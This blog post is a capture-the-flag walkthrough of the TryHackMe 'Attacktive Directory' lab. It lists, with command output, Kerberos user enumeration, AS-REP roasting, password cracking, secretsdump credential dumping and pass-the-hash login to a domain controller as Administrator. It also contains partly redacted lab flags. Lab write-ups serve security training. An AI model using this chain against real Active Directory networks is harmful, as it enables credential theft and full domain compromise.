+++
title = "Attacktive Directory - TryHackMe Writup"
description = "Exploit a vulnerable domain controller."
date = 2024-10-23
slug = "attacktive-directory"
image = "attacktive_directory.png"

[taxonomies]
categories = ["TryHackMe", "Writups"]
tags = ["attacktive directory", "tryhackme", "active directory", "domain controller"]
+++

<div style="display: flex; align-items: center;">
  <div>
	<img src="attacktive_directory.png" alt="Attacktive Directory" width="100"/>
  </div>
  <div style="margin-left: 10px;">
	<i>99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?</i>
  </div>
</div>

# Scanning
Target IP: 10.10.186.106

The result of nmap scan is 
<pre>
> nmap -sV 110.10.186.106 -v
......
Host is up (0.17s latency).
Not shown: 986 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-16 15:07:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
</pre>

## Enumeration

`enum4linux` is used for the enumeration of port 139/445

The result is
<pre>
❯ enum4linux -a 10.10.186.106
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct 17 07:48:03 2024

 =========================================( Target Information )=========================================

Target ........... 10.10.186.106
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.10.186.106 )===========================
.....
[E] Can't find workgroup/domain

 ===============================( Nbtstat Information for 10.10.186.106 )===============================

Can't load /etc/samba/smb.conf - run testparm to debug it
Looking up status of 10.10.186.106
No reply from 10.10.186.106

 ===================================( Session Check on 10.10.186.106 )===================================


[+] Server 10.10.186.106 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.186.106 )================================

Can't load /etc/samba/smb.conf - run testparm to debug it
Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)
......
 =================================( Share Enumeration on 10.10.186.106 )=================================

Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.186.106
......
</pre>

Here we got the NETBIOS domain name. Also `.local` is the invalid TLD most of the people use for AD,. The same is shown in this case too.

## Enumerating Users via Kerberos
`kerbrute` tool is used here. `userenum` is used to enumerate username. To run the command we need to setup domain name, so append this line in `/etc/hosts`. Userlist should be the provided one.

`10.10.186.106 spookysec.local`

Now runnning the command `kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt` we are getting valid usernames. The answer are already there.

## Abusing Kerberos

The two account here mentioned are already found in above task. The result of above command for one of them is like 
`2024/10/17 08:12:33 >  [+] svc-***** has no pre auth required. Dumping hash to crack offline:` and this is the answer we need.

Now running `GetNPUsers.py` tool of impacket to reterive information about the user. This is TGT, and this is already we have. The result is like
<pre>
❯ /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Cannot authenticate svc-admin, getting its TGT
/opt/impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$svc-*****@SPOOKYSEC.LOCAL:279edbdaf153fbd3c5e418fd97266821$3efe8c8212644d80f88de5f5e93b09ff8834c57ff88fcbc77d7f50a67073623623c247fe17c9d90.......
</pre>

Locking into the hash, we got name and mode. The mode is needed to crack the hash using `hashcat` but for `john` mode is not needed. In this case we are using john.

Here we got the password as
<pre>
❯ john svc-admin.hash --wordlist=passwordlist.txt
.....
Press 'q' or Ctrl-C to abort, almost any other key for status
mana**********   ($krb5asrep$23$svc-*****@SPOOKYSEC.LOCAL)
1g 0:00:00:00 DONE (2024-10-17 08:33) 2.325g/s 16669p/s 16669c/s 16669C/s horoscope..frida
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</pre>

## Back to the Basics

Here we got the shares

<pre>
❯ smbclient -L 10.10.186.106 --user svc-*****
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\svc-admin]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
</pre>

Now connecting with backup share. We got something special. Download and acess this file as
<pre>
❯ smbclient \\\\10.10.186.106\\backup --user svc-***** --password mana**********
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr  5 00:53:39 2020
  ..                                  D        0  Sun Apr  5 00:53:39 2020
  backup_credentials.txt              A       48  Sun Apr  5 00:53:53 2020

		8247551 blocks of size 4096. 3631513 blocks available
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
</pre>

There is a cipher. THis is encoded into base 64, decoding it.
<pre>
❯ base64 -d backup_credentials.txt
backup@spookysec.local:backu******** 
</pre>

## Elevating Privileges within the Domain

We are using `secretsdump.py` here and the above domain controller. Password is required and this is already with us by decoding above cipher.

The command to run is `./secretsdump.py -just-dc backup@spookysec.local`

Now we have all the answer to the question mentioned here. Also there is a method of attack called `Pass The Hash`, which allow us to authenticate as user without password and we have all the hashes so good to go.

## Flag Submission Panel

Now need to logged in using hash for different user, mentioned there to get and submit flag using tool `Evil-WinRM`.

User to try are `svc-admin`, `backup` and `Administrator`.

We are connected via Administrator using `evil-winrm -i 10.10.186.106 -u Administrator -H 0e0363213e37b9**********b0bcb4fc`

The flags are as 
<pre>
*Evil-WinRM* PS C:\Users\svc-admin\Desktop> cat user.txt.txt
TryHackMe{K3rb3r0**********}

*Evil-WinRM* PS C:\Users\backup\Desktop> cat PrivEsc.txt
TryHackMe{B4ckM**********}

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
TryHackMe{4ctiveD1rec**********}
</pre>

Now we have completed the task, this was the hacking of domain controller.

Happy Hacking !!